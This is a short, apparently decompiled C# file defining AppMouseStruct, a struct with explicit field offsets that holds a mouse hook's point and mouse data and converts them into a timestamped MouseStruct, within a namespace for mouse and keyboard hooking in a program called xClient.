using System;
using System.Runtime.InteropServices;

namespace xClient.Core.MouseKeyHook.WinApi;

[StructLayout(LayoutKind.Explicit)]
internal struct AppMouseStruct
{
	[FieldOffset(0)]
	public Point Point;

	[FieldOffset(22)]
	public short MouseData;

	public MouseStruct ToMouseStruct()
	{
		MouseStruct result = default(MouseStruct);
		result.Point = Point;
		result.MouseData = MouseData;
		result.Timestamp = Environment.TickCount;
		return result;
	}
}
